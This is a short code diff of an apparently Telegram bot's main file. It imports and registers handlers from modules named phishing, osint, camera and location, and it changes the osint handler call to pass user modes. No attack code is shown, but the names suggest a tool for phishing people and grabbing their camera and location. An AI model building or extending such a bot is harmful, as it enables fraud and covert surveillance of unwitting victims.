@@ -24,16 +24,17 @@ setup_start_handler(bot, users, user_modes)
 setup_verification_handler(bot, users)
 
 # ✅ Add your feature handlers
+# ✅ Add your feature handlers
 from phishing import setup_phishing_handler
 from osint import setup_osint_handler
 from camera import setup_camera_handler
 from location import setup_location_handler
-# Add more as needed...
 
 setup_phishing_handler(bot)
-setup_osint_handler(bot)
+setup_osint_handler(bot, user_modes)  # ✅ Fixed line
 setup_camera_handler(bot)
 setup_location_handler(bot)
+
 
 # ✅ Fallback for unknown messages
 @bot.message_handler(func=lambda msg: True)
